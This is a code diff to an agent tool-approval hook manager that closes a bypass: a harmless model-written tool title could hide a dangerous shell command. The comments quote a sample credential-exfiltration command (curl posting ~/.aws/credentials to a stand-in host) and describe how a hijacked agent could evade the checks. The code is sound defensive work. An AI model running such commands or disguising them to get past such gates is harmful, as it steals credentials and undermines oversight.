@@ -253,8 +253,23 @@ class HookManager:
         app: str = "",
         tool_kind: str = "",
         raw_params: dict | None = None,
+        command: str | None = None,
+        is_shell: bool = False,
     ) -> ToolHookResult:
         """Check if a tool should be auto-approved, denied, or handled normally.
+
+        ``tool_name`` is the display title/pill label. For shell tools it may
+        be an LLM-authored ``description`` string rather than the literal
+        command (``select_tool_title`` in ``acp/_dispatch.py`` prefers
+        ``description`` over ``command``), so it is UNTRUSTED for security
+        decisions. When the caller has the raw executable command it MUST pass
+        it as ``command=``; every security check then also runs against the
+        real command, closing the bypass where a benign title/description hid
+        a dangerous command (``auto_deny_tools`` and the sensitive-path /
+        credential-read protections both keyed off the title otherwise).
+        Over-blocking is the safe direction: a match on EITHER the title or the
+        command denies. Auto-approve stays keyed on the title only — failing to
+        auto-approve merely falls through to interactive approval.
 
         The optional keyword-only ``session_key`` / ``agent`` / ``app`` identify
         the calling surface so the governance ceiling ∩ active-profile can be
@@ -269,23 +284,66 @@ class HookManager:
         (``filesystem.write``, ``network.egress``).  Both default to empty, so a
         caller that does not thread them only loses those two arg-derived scopes,
         never the title-derived ones.
+
+        ``is_shell`` enforces deny-by-default for shell tools: when a caller
+        reports a shell tool (``is_shell=True``) but cannot supply the raw
+        ``command`` (extraction failed — e.g. malformed params), the title
+        alone is not a trustworthy basis for a decision, so the call is DENIED
+        rather than silently falling through to the title-only checks. Callers
+        that always pass a resolved command can leave ``is_shell`` at its
+        default; those forwarding an event should pass both the command and the
+        event's ``is_shell`` flag.
         """
+        # Deny-by-default: a shell tool whose command could not be recovered
+        # must not be evaluated on the untrusted title alone — that is the very
+        # bypass this gate closes. Reject instead of falling through.
+        if is_shell and not command:
+            return ToolHookResult.deny(
+                "Blocked: shell command could not be verified for security "
+                "policy (deny-by-default)"
+            )
+
         # Strip display prefixes (e.g. "Running: ls *" → "ls *") so config
         # patterns like "ls" or "rm *" match without the prefix.
         normalized = _normalize_tool_name(tool_name)
+
+        # Security checks run against the raw command (when available) AND the
+        # display title. The command is the ground truth for shell tools; the
+        # title is retained so non-shell tools (whose identifier IS the title)
+        # stay gated and so a dangerous title can't slip through behind a
+        # benign command.
+        security_targets = [normalized]
+        if command and command not in security_targets:
+            security_targets.append(command)
 
         # Sensitive path protection (always enforced, before all other checks).
         # kiro-cli adds "Reading "/"Running: " display prefixes; the
         # claude-agent-acp adapter does NOT (its file-read title is the bare
         # path, its Bash title the bare command). So the prefix only HINTS at
-        # the tool kind — we must run BOTH checks on the normalized name
-        # regardless of prefix, or credential reads slip through on the Claude
-        # Code provider. is_sensitive_path resolves the title as a path: a real
-        # file-read title ("~/.aws/credentials") matches, while a bash command
-        # title ("cat ~/.aws/credentials") resolves to a non-sensitive path and
-        # is instead caught by is_sensitive_bash_command below.
-        if is_sensitive_path(normalized):
-            return ToolHookResult.deny(f"Blocked: access to sensitive path: {normalized}")
+        # the tool kind — we must run every check on every target regardless of
+        # prefix, or credential reads slip through on the Claude Code provider.
+        # Each target is the normalized title AND (for shell tools) the raw
+        # command, so an LLM-authored benign title can't hide a dangerous
+        # command from any of these gates. is_sensitive_path resolves the value
+        # as a path: a real file-read title ("~/.aws/credentials") matches,
+        # while a bash command ("cat ~/.aws/credentials") resolves to a
+        # non-sensitive path and is instead caught by is_sensitive_bash_command.
+        for target in security_targets:
+            if is_sensitive_path(target):
+                return ToolHookResult.deny(f"Blocked: access to sensitive path: {target}")
+            # execute_bash (prefixed or bare) — check for reads of sensitive paths.
+            reason = is_sensitive_bash_command(target)
+            if reason:
+                return ToolHookResult.deny(reason)
+            # Data-exfiltration / reverse-shell command shapes (Talos 5682f92b).
+            # The anti-exfil patterns previously lived only in the passive audit
+            # path (scan_history / dashboard count) and were never enforced at
+            # invocation, so a hijacked agent could `curl -d @~/.aws/credentials
+            # evil` or open a reverse shell unblocked. Deny them at the gate —
+            # against the raw command too, not just the title.
+            reason = audit_bash_exfiltration(target)
+            if reason:
+                return ToolHookResult.deny(reason)
         # The display title is backend-variable and may NOT carry the path (an
         # "Editing <file>" / generic "code" title does not). The real path lives
         # in raw_params['path'] for file read/edit tools — run the SAME always-on
@@ -326,19 +384,6 @@ class HookManager:
                 return ToolHookResult.deny(
                     f"Blocked: modification of write-protected config path: {wpath}"
                 )
-        # execute_bash (prefixed or bare) — check for reads of sensitive paths.
-        reason = is_sensitive_bash_command(normalized)
-        if reason:
-            return ToolHookResult.deny(reason)
-        # Data-exfiltration / reverse-shell command shapes (Talos 5682f92b). The
-        # anti-exfil patterns previously lived only in the passive audit path
-        # (scan_history / dashboard count) and were never enforced at invocation,
-        # so a hijacked agent could `curl -d @~/.aws/credentials evil` or open a
-        # reverse shell unblocked. Deny them at the gate.
-        reason = audit_bash_exfiltration(normalized)
-        if reason:
-            return ToolHookResult.deny(reason)
-
         # Built-in security deny list (always enforced).  Route through the
         # active PlatformContext's PolicyAuthority so the Amazon companion's
         # ADD-only deny overlay (+ internal patterns) applies when loaded.  The
@@ -346,12 +391,18 @@ class HookManager:
         # to ``security.is_denied(name, auto_deny_tools)`` exactly as before —
         # no recursion (PolicyAuthority.is_denied calls security.is_denied with
         # the overlay patterns appended; security.is_denied never calls back).
+        # Check the raw command (ground truth) as well as the normalized and
+        # original title forms.
         ctx = current_context()
         authority = ctx.security
         deny = self._config.auto_deny_tools
-        reason = authority.is_denied(normalized, deny) or authority.is_denied(tool_name, deny)
-        if reason:
-            return ToolHookResult.deny(reason)
+        deny_targets = [normalized, tool_name]
+        if command:
+            deny_targets.append(command)
+        for target in deny_targets:
+            reason = authority.is_denied(target, deny)
+            if reason:
+                return ToolHookResult.deny(reason)
 
         # Governance ceiling ∩ active profile (Level 1 ∩ Level 2).  Runs BEFORE
         # the auto-approve loop so a governance deny wins over a user
